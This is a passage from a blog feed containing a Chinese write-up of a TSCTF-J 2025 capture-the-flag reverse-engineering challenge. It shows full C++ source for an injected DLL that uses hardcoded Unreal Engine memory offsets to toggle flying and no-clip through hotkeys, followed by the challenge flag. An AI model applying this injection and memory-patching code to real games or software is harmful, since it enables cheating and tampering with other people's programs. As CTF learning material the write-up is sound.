class="number">0</span>,</span><br><span class="line">    MOVE_Walking = <span class="number">1</span>,</span><br><span class="line">    MOVE_NavWalking,</span><br><span class="line">    MOVE_Falling,</span><br><span class="line">    MOVE_Swimming,</span><br><span class="line">    MOVE_Flying,</span><br><span class="line">    MOVE_Custom</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">ECollisionEnabled</span> : <span class="type">uint8_t</span> &#123;</span><br><span class="line">    NoCollision = <span class="number">0</span>,</span><br><span class="line">    QueryOnly = <span class="number">1</span>,</span><br><span class="line">    PhysicsOnly = <span class="number">2</span>,</span><br><span class="line">    QueryAndPhysics = <span class="number">3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">uintptr_t</span> OFFSET_GWORLD = <span class="number">0x49EE370</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UWORLD_OWNING_GI = <span class="number">0x180</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UGAMEINSTANCE_LOCALPLAYERS = <span class="number">0x38</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ULOCALPLAYER_PLAYERCONTROLLER = <span class="number">0x30</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_APLAYERCONTROLLER_ACKPAWN = <span class="number">0x2A0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ACHARACTER_MOVEMENT = <span class="number">0x288</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ACHARACTER_CAPSULE = <span class="number">0x290</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_MOVEMENTMODE = <span class="number">0x168</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_DEFAULTLANDMODE = <span class="number">0x384</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_PENDINGLAUNCH = <span class="number">0x3C0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_LASTUPDATEVELO = <span class="number">0x25C</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UPRIMITIVE_BODYINSTANCE = <span class="number">0x2C8</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_FBODYINSTANCE_COLLISIONENABLED = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_running&#123; <span class="literal">true</span> &#125;;</span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_userFly&#123; <span class="literal">false</span> &#125;;</span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_autoFlyFromCollision&#123; <span class="literal">false</span> &#125;;</span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_noCollision&#123; <span class="literal">false</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">uintptr_t</span> <span class="title">GetModuleBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">uintptr_t</span> base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uintptr_t</span>&gt;(::<span class="built_in">GetModuleHandleW</span>(<span class="literal">nullptr</span>));</span><br><span class="line">    <span class="keyword">return</span> base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UWorld* <span class="title">GetWorld</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UWorld**&gt;(<span class="built_in">GetModuleBase</span>() + OFFSET_GWORLD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UGameInstance* <span class="title">GetGameInstance</span><span class="params">(UWorld* world)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!world) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UGameInstance**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(world) + OFFSET_UWORLD_OWNING_GI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> TArray&lt;ULocalPlayer*&gt;&amp; <span class="title">GetLocalPlayers</span><span class="params">(UGameInstance* gi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">reinterpret_cast</span>&lt;TArray&lt;ULocalPlayer*&gt;*&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(gi) + OFFSET_UGAMEINSTANCE_LOCALPLAYERS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> APlayerController* <span class="title">GetPlayerController</span><span class="params">(ULocalPlayer* lp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;APlayerController**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(lp) + OFFSET_ULOCALPLAYER_PLAYERCONTROLLER);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> ACharacter* <span class="title">GetAcknowledgedCharacter</span><span class="params">(APlayerController* pc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;ACharacter**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(pc) + OFFSET_APLAYERCONTROLLER_ACKPAWN);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UCharacterMovementComponent* <span class="title">GetCharacterMovement</span><span class="params">(ACharacter* character)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UCharacterMovementComponent**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(character) + OFFSET_ACHARACTER_MOVEMENT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UCapsuleComponent* <span class="title">GetCapsuleComponent</span><span class="params">(ACharacter* character)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UCapsuleComponent**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(character) + OFFSET_ACHARACTER_CAPSULE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ApplyFlyState</span><span class="params">(UCharacterMovementComponent* movement, <span class="type">bool</span> enable, <span class="type">bool</span> giveBoost)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!movement) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(movement);</span><br><span class="line">    <span class="keyword">auto</span>&amp; movementMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; defaultLand = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_DEFAULTLANDMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; pendingLaunch = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_PENDINGLAUNCH);</span><br><span class="line">    <span class="keyword">auto</span>&amp; lastUpdateVel = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_LASTUPDATEVELO);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (enable) &#123;</span><br><span class="line">        movementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">        defaultLand = EMovementMode::MOVE_Flying;</span><br><span class="line">        <span class="keyword">if</span> (giveBoost) &#123;</span><br><span class="line">            pendingLaunch = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">800.f</span> &#125;;</span><br><span class="line">            lastUpdateVel = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">600.f</span> &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            pendingLaunch = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">            lastUpdateVel = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        movementMode = EMovementMode::MOVE_Walking;</span><br><span class="line">        defaultLand = EMovementMode::MOVE_Walking;</span><br><span class="line">        pendingLaunch = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">        lastUpdateVel = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SustainFly</span><span class="params">(UCharacterMovementComponent* movement, <span class="type">bool</span> giveBoost)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!movement) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(movement);</span><br><span class="line">    <span class="keyword">auto</span>&amp; movementMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; lastUpdateVel = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_LASTUPDATEVELO);</span><br><span class="line"></span><br><span class="line">    movementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">    <span class="keyword">if</span> (giveBoost &amp;&amp; lastUpdateVel.Z &lt; <span class="number">300.f</span>) &#123;</span><br><span class="line">        lastUpdateVel.Z = <span class="number">400.f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ApplyCollisionState</span><span class="params">(UCapsuleComponent* capsule, <span class="type">bool</span> noCollision)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!capsule) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* primitive = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(capsule);</span><br><span class="line">    <span class="keyword">auto</span>&amp; collisionEnabled = *<span class="built_in">reinterpret_cast</span>&lt;ECollisionEnabled*&gt;(</span><br><span class="line">        primitive + OFFSET_UPRIMITIVE_BODYINSTANCE + OFFSET_FBODYINSTANCE_COLLISIONENABLED);</span><br><span class="line"></span><br><span class="line">    collisionEnabled = noCollision ? ECollisionEnabled::NoCollision</span><br><span class="line">        : ECollisionEnabled::QueryAndPhysics;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ShouldFly</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> g_userFly.<span class="built_in">load</span>() || g_autoFlyFromCollision.<span class="built_in">load</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">FlyThread</span><span class="params">(LPVOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (g_running) &#123;</span><br><span class="line">        <span class="keyword">if</span> (::<span class="built_in">GetAsyncKeyState</span>(VK_F6) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (!gi) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">            <span class="keyword">if</span> (!players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) || !players[<span class="number">0</span>]) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">if</span> (!pc) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">            <span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character);</span><br><span class="line">            <span class="keyword">if</span> (!movement) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            g_userFly = !g_userFly.<span class="built_in">load</span>();</span><br><span class="line">            <span class="built_in">ApplyFlyState</span>(movement, <span class="built_in">ShouldFly</span>(), g_userFly.<span class="built_in">load</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (::<span class="built_in">GetAsyncKeyState</span>(VK_F5) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (!gi) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">            <span class="keyword">if</span> (!players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) || !players[<span class="number">0</span>]) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">if</span> (!pc) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">            <span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character);</span><br><span class="line">            <span class="keyword">auto</span> capsule = <span class="built_in">GetCapsuleComponent</span>(character);</span><br><span class="line">            <span class="keyword">if</span> (!movement || !capsule) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">bool</span> newState = !g_noCollision.<span class="built_in">load</span>();</span><br><span class="line">            g_noCollision = newState;</span><br><span class="line">            g_autoFlyFromCollision = newState;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">ApplyCollisionState</span>(capsule, newState);</span><br><span class="line">            <span class="built_in">ApplyFlyState</span>(movement, <span class="built_in">ShouldFly</span>(), g_userFly.<span class="built_in">load</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            玩家切关、死亡重生、切换 Pawn 时，GWorld、GameInstance、LocalPlayers 乃至 AcknowledgedPawn 都可能变；</span></span><br><span class="line"><span class="comment">            如果只在按热键那一刻取一次指针，等角色重建后就指向旧对象，易崩溃或写不到新角色。</span></span><br><span class="line"><span class="comment">            循环里每次重新取 GWorld→GameInstance→LocalPlayer→PlayerController→Pawn→Movement/ Capsule，</span></span><br><span class="line"><span class="comment">            能在状态变化时自动跟上，确保对当前角色生效，也避免解引用野指针。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ShouldFly</span>() || g_noCollision.<span class="built_in">load</span>()) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (gi) &#123;</span><br><span class="line">                <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">                <span class="keyword">if</span> (players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) &amp;&amp; players[<span class="number">0</span>]) &#123;</span><br><span class="line">                    <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">                    <span class="keyword">if</span> (pc) &#123;</span><br><span class="line">                        <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character)) &#123;</span><br><span class="line">                            <span class="built_in">SustainFly</span>(movement, g_userFly.<span class="built_in">load</span>());</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">auto</span> capsule = <span class="built_in">GetCapsuleComponent</span>(character); g_noCollision.<span class="built_in">load</span>()) &#123;</span><br><span class="line">                            <span class="built_in">ApplyCollisionState</span>(capsule, <span class="literal">true</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        std::this_thread::<span class="built_in">sleep_for</span>(std::chrono::<span class="built_in">milliseconds</span>(<span class="number">20</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE <span class="keyword">module</span>, DWORD reason, LPVOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (reason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        ::<span class="built_in">DisableThreadLibraryCalls</span>(<span class="keyword">module</span>);</span><br><span class="line"></span><br><span class="line">        ::<span class="built_in">MessageBoxW</span>(<span class="literal">nullptr</span>,</span><br><span class="line">            <span class="string">L&quot;TSCTF DLL 注入成功\nF6 切换飞行模式\nF5 切换穿墙模式&quot;</span>,</span><br><span class="line">            <span class="string">L&quot;TSCTF Helper&quot;</span>,</span><br><span class="line">            MB_OK | MB_ICONINFORMATION);</span><br><span class="line"></span><br><span class="line">        ::<span class="built_in">CreateThread</span>(<span class="literal">nullptr</span>, <span class="number">0</span>, FlyThread, <span class="literal">nullptr</span>, <span class="number">0</span>, <span class="literal">nullptr</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (reason == DLL_PROCESS_DETACH) &#123;</span><br><span class="line">        g_running = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Flag：TSCTF-J{u0real_or_R1AL?!</p><p>还有一段flag找不到</p><p>只能看wp了</p><p>看了题解是藏在前面了_and_here}</p><p>TSCTF-J{u0real_or_R1AL?!_and_here}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;TSCTF-J-2025-wp&quot;&gt;&lt;a href=&quot;#TSCTF-J-2025-wp&quot; class=&quot;headerlink&quot; title=&quot;TSCTF-J 2025 wp&quot;&gt;&lt;/a&gt;TSCTF-J 2025 wp&lt;/h1&gt;&lt;p&gt;本次TSCTF-J，共解出27道题，</summary>
      
    
    
    
    <category term="CTF wp" scheme="http://matriy330.github.io/categories/CTF-wp/"/>
    
    
    <category term="wp" scheme="http://matriy330.github.io/tags/wp/"/>
    
  </entry>
  
</feed>
